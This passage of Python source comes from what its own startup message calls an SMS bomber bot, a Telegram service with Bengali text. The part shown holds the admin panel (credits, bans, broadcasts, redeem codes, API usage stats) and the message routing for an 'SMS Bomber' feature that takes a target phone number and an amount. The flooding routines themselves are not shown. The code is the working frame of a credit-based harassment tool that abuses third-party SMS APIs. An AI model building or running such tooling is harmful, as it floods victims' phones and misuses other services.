        async with db.execute(
            "SELECT admin_id, action, target_id, details, log_time FROM admin_logs ORDER BY log_time DESC LIMIT 20"
        ) as cur:
            logs = await cur.fetchall()
    if not logs:
        await update.message.reply_text("📜 কোনো লগ নেই!", reply_markup=get_admin_keyboard())
        return
    response = "📜 **অ্যাডমিন লগ**\n\n"
    for log in logs:
        response += f"🕐 {log[4][:16]} - {log[1]}\n"
        if log[2]:
            response += f"   👤 {log[2]}\n"
        if log[3]:
            response += f"   📝 {log[3]}\n"
        response += "\n"
    await update.message.reply_text(response, parse_mode="Markdown", reply_markup=get_admin_keyboard())

async def admin_live_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT COUNT(*) FROM api_usage") as cur:
            total_calls = (await cur.fetchone())[0]
        async with db.execute("SELECT COUNT(*) FROM api_usage WHERE DATE(usage_time) = DATE('now')") as cur:
            today_calls = (await cur.fetchone())[0]
        async with db.execute("SELECT COUNT(*) FROM api_usage WHERE success = 1") as cur:
            total_success = (await cur.fetchone())[0]
        async with db.execute("SELECT COUNT(*) FROM api_usage WHERE success = 0") as cur:
            total_failed = (await cur.fetchone())[0]
        async with db.execute(
            "SELECT api_name, total_success, total_failed FROM api_stats ORDER BY total_success DESC LIMIT 5"
        ) as cur:
            top_apis = await cur.fetchall()
    response = (
        f"📊 **লাইভ API স্ট্যাটস**\n🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n━━━━━━━━━━━━━━━━\n"
        f"📈 মোট কল: {total_calls}\n📆 আজ: {today_calls}\n✅ সফল: {total_success}\n❌ ব্যর্থ: {total_failed}\n\n🏆 **শীর্ষ ৫ এপিআই:**\n"
    )
    for i, api in enumerate(top_apis, 1):
        total = api[1] + api[2]
        rate = round((api[1] / total) * 100, 2) if total > 0 else 0
        response += f"{i}. {api[0]}: ✅{api[1]} ❌{api[2]} ({rate}%)\n"
    await update.message.reply_text(response, parse_mode="Markdown", reply_markup=get_admin_keyboard())

async def admin_api_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute(
            "SELECT api_name, total_calls, total_success, total_failed FROM api_stats ORDER BY total_calls DESC"
        ) as cur:
            apis = await cur.fetchall()
    if not apis:
        await update.message.reply_text("📊 কোনো API স্ট্যাটস নেই!", reply_markup=get_admin_keyboard())
        return
    response = "📈 **API স্ট্যাটস**\n━━━━━━━━━━━━━━━━\n"
    for api in apis[:15]:
        rate = round((api[2] / api[1]) * 100, 2) if api[1] > 0 else 0
        response += f"📡 {api[0]}\n├─ কল: {api[1]}\n├─ ✅{api[2]} ❌{api[3]}\n└─ সাফল্য: {rate}%\n\n"
    await update.message.reply_text(response, parse_mode="Markdown", reply_markup=get_admin_keyboard())

async def admin_users_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute(
            "SELECT user_id, username, balance, total_sms, total_bombing, status FROM users ORDER BY user_id DESC LIMIT 20"
        ) as cur:
            users = await cur.fetchall()
    if not users:
        await update.message.reply_text("👥 কোনো ইউজার নেই!", reply_markup=get_admin_keyboard())
        return
    response = "👥 **সাম্প্রতিক ইউজার**\n━━━━━━━━━━━━━━━━\n"
    for i, u in enumerate(users, 1):
        response += f"{i}. ID: `{u[0]}` - {u[1] or 'N/A'}\n   💰{u[2]} 📨{u[3]} 💣{u[4]} 🚦{u[5]}\n\n"
    await update.message.reply_text(response, parse_mode="Markdown", reply_markup=get_admin_keyboard())

async def admin_api_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    response = f"📡 **API লিস্ট** (মোট {len(WORKING_APIS)})\n━━━━━━━━━━━━━━━━\n"
    for i, api in enumerate(WORKING_APIS, 1):
        response += f"{i}. {api['name']}\n"
    await update.message.reply_text(response, parse_mode="Markdown", reply_markup=get_admin_keyboard())

async def admin_state_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    message = update.message.text
    state = context.user_data.get('admin_state')
    if state == 'add_credit':
        try:
            parts = message.split()
            target = int(parts[0]); amount = int(parts[1])
            async with aiosqlite.connect(DB_PATH) as db:
                await db.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, target))
                await db.commit()
            await admin_log(user_id, "ক্রেডিট যোগ", target, f"{amount}")
            await update.message.reply_text(f"✅ {amount} ক্রেডিট যোগ করা হয়েছে {target} এ!", reply_markup=get_admin_keyboard())
        except:
            await update.message.reply_text("❌ ফরম্যাট: `ID AMOUNT`", parse_mode="Markdown")
        finally:
            context.user_data['admin_state'] = None
    elif state == 'remove_credit':
        try:
            parts = message.split()
            target = int(parts[0]); amount = int(parts[1])
            async with aiosqlite.connect(DB_PATH) as db:
                await db.execute("UPDATE users SET balance = balance - ? WHERE user_id = ?", (amount, target))
                await db.commit()
            await admin_log(user_id, "ক্রেডিট কমানো", target, f"{amount}")
            await update.message.reply_text(f"✅ {amount} ক্রেডিট কমানো হয়েছে {target} থেকে!", reply_markup=get_admin_keyboard())
        except:
            await update.message.reply_text("❌ ফরম্যাট: `ID AMOUNT`", parse_mode="Markdown")
        finally:
            context.user_data['admin_state'] = None
    elif state == 'ban_user':
        try:
            target = int(message.strip())
            async with aiosqlite.connect(DB_PATH) as db:
                await db.execute("UPDATE users SET status = 'banned' WHERE user_id = ?", (target,))
                await db.commit()
            await admin_log(user_id, "ব্যান", target)
            await update.message.reply_text(f"🚫 ইউজার {target} ব্যান করা হয়েছে!", reply_markup=get_admin_keyboard())
        except:
            await update.message.reply_text("❌ সঠিক আইডি দিন!")
        finally:
            context.user_data['admin_state'] = None
    elif state == 'unban_user':
        try:
            target = int(message.strip())
            async with aiosqlite.connect(DB_PATH) as db:
                await db.execute("UPDATE users SET status = 'active' WHERE user_id = ?", (target,))
                await db.commit()
            await admin_log(user_id, "আনব্যান", target)
            await update.message.reply_text(f"✅ ইউজার {target} আনব্যান করা হয়েছে!", reply_markup=get_admin_keyboard())
        except:
            await update.message.reply_text("❌ সঠিক আইডি দিন!")
        finally:
            context.user_data['admin_state'] = None
    elif state == 'broadcast':
        broadcast_text = message
        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute("SELECT user_id FROM users WHERE status = 'active'") as cur:
                users = await cur.fetchall()
        await update.message.reply_text(f"⏳ {len(users)} জন ইউজারকে ব্রডকাস্ট করা হচ্ছে...")
        success = 0
        for u in users:
            try:
                await context.bot.send_message(u[0], f"📢 **অ্যাডমিন বার্তা**\n\n{broadcast_text}", parse_mode='Markdown')
                success += 1
                await asyncio.sleep(0.05)
            except:
                pass
        await admin_log(user_id, "ব্রডকাস্ট", None, f"{success} জন পেয়েছেন")
        await update.message.reply_text(f"✅ ব্রডকাস্ট সফল! {success} জন পেয়েছেন।", reply_markup=get_admin_keyboard())
        context.user_data['admin_state'] = None
    elif state == 'create_code':
        try:
            parts = message.split()
            code = parts[0].upper(); amount = int(parts[1]); usages = int(parts[2])
            async with aiosqlite.connect(DB_PATH) as db:
                await db.execute(
                    "INSERT INTO redeem_codes (code, amount, usages, created_by) VALUES (?, ?, ?, ?)",
                    (code, amount, usages, user_id)
                )
                await db.commit()
            await admin_log(user_id, "কোড তৈরি", None, f"{code} {amount}x{usages}")
            await update.message.reply_text(f"✅ কোড তৈরি: `{code}`\n💰 {amount} ক্রেডিট\n👥 {usages} বার ব্যবহার", parse_mode="Markdown", reply_markup=get_admin_keyboard())
        except:
            await update.message.reply_text("❌ ফরম্যাট: `CODE AMOUNT USAGES`", parse_mode="Markdown")
        finally:
            context.user_data['admin_state'] = None

# ===================== মেসেজ হ্যান্ডলার =====================
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    message = update.message.text
    logger.info(f"📩 {user_id} থেকে মেসেজ: {message}")

    # অ্যাডমিন চয়েস মেনু হ্যান্ডলিং
    if user_id == ADMIN_ID:
        if message == "👑 Admin Panel":
            await update.message.reply_text("👑 **অ্যাডমিন প্যানেল**", parse_mode="Markdown", reply_markup=get_admin_keyboard())
            return
        elif message == "👤 User Menu":
            await update.message.reply_text("👤 **ইউজার মেনু**", parse_mode="Markdown", reply_markup=get_main_keyboard())
            return

        if message in ["💰 Add Credit", "➖ Remove Credit", "🚫 Ban User", "✅ Unban User",
                       "📣 Broadcast", "🎟️ Create Code", "💰 Total Balance", "🏆 Top Users",
                       "📤 Export Data", "🔄 Reset Limits", "🗑️ Clear Logs", "📜 Admin Logs",
                       "📊 Live Stats", "📈 API Stats", "👥 Users List", "📋 API List"]:
            if message == "💰 Add Credit":
                await admin_add_credit(update, context)
            elif message == "➖ Remove Credit":
                await admin_remove_credit(update, context)
            elif message == "🚫 Ban User":
                await admin_ban_user(update, context)
            elif message == "✅ Unban User":
                await admin_unban_user(update, context)
            elif message == "📣 Broadcast":
                await admin_broadcast(update, context)
            elif message == "🎟️ Create Code":
                await admin_create_code(update, context)
            elif message == "💰 Total Balance":
                await admin_total_balance(update, context)
            elif message == "🏆 Top Users":
                await admin_top_users(update, context)
            elif message == "📤 Export Data":
                await admin_export_data(update, context)
            elif message == "🔄 Reset Limits":
                await admin_reset_limits(update, context)
            elif message == "🗑️ Clear Logs":
                await admin_clear_logs(update, context)
            elif message == "📜 Admin Logs":
                await admin_logs(update, context)
            elif message == "📊 Live Stats":
                await admin_live_stats(update, context)
            elif message == "📈 API Stats":
                await admin_api_stats(update, context)
            elif message == "👥 Users List":
                await admin_users_list(update, context)
            elif message == "📋 API List":
                await admin_api_list(update, context)
            return
        elif message == "🔙 Back":
            await update.message.reply_text("🏠 অ্যাডমিন মেনু", reply_markup=get_admin_keyboard())
            context.user_data.clear()
            return
        if context.user_data.get('admin_state'):
            await admin_state_handler(update, context)
            return

    # ব্যান চেক
    if await is_user_banned(user_id):
        await update.message.reply_text("🚫 আপনার অ্যাকাউন্ট ব্যান করা হয়েছে!")
        return

    # ইউজার ব্যাক
    if message == "🔙 Back":
        await update.message.reply_text("🏠 মেইন মেনু", reply_markup=get_main_keyboard())
        context.user_data.clear()
        return

    # ইউজার মেনু
    if message == "📨 Send SMS":
        await cmd_sms(update, context)
    elif message == "💣 SMS Bomber":
        await cmd_bomber(update, context)
    elif message == "👤 My Profile":
        await profile(update, context)
    elif message == "🎁 Redeem Code":
        await redeem(update, context)
    elif message == "📊 My Stats":
        await stats(update, context)
    elif message == "📞 Contact Admin":
        await contact(update, context)
    else:
        state = context.user_data.get('state')
        if state == 'sms_number':
            await sms_number(update, context)
        elif state == 'sms_message':
            await sms_message(update, context)
        elif state == 'bomber_number':
            await bomber_number(update, context)
        elif state == 'bomber_amount':
            await bomber_amount(update, context)
        elif state == 'redeem_code':
            await redeem_process(update, context)
        else:
            await update.message.reply_text("❌ অনুগ্রহ করে নিচের বাটন ব্যবহার করুন:", reply_markup=get_main_keyboard())

# ===================== মেইন =====================
async def main():
    print("="*60)
    print("🔥 SMS বোম্বার বট চালু হচ্ছে...")
    load_api_list()
    await init_db()
    print(f"✅ {len(WORKING_APIS)} টি API লোড হয়েছে")
    print(f"👑 অ্যাডমিন ID: {ADMIN_ID}")
    print("="*60)
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    await application.initialize()
    await application.start()
    await application.updater.start_polling()
    print("✅ বট চালু আছে!")
    print("="*60)
    while True:
        await asyncio.sleep(1)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n⛔ বট বন্ধ করা হয়েছে!")
    except Exception as e:
        print(f"❌ মারাত্মক ত্রুটি: {e}")
